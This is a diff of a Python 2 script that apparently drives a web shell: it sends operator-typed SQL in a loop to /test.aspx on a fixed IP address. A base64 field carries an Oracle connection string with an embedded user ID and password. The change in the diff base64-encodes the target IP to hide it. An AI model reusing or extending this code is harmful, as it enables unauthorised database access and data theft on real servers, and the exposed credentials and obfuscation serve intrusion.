@@ -19,9 +19,9 @@ while sql_str<>'exit':
 				'z1':'UHJvdmlkZXI9T3JhT0xFREIuT3JhY2xlO0RhdGEgU291cmNlPXR0ZGJfNjE7VXNlciBJZD10dG1pcztQYXNzd29yZD13c2hzeXNoZXdsZXR0emdkO1BlcnNpc3QgU2VjdXJpdHkgSW5mbz1UcnVlOw==',
 				'z2':encode_sql}
 	test_data_urlencode = urllib.urlencode(test_data)
-	headerdata = {"Host":"210.32.205.60",
-				  "Content-type": "application/x-www-form-urlencoded"}
-	conn = httplib.HTTPConnection("210.32.205.60")	
+	ttdb = base64.b64decode('MjEwLjMyLjIwNS42MA==')
+	headerdata = {"Content-type": "application/x-www-form-urlencoded"}
+	conn = httplib.HTTPConnection(ttdb)	
 	conn.request("POST","/test.aspx",test_data_urlencode,headerdata) 
 	response = conn.getresponse()
 	print response.status, response.reason 
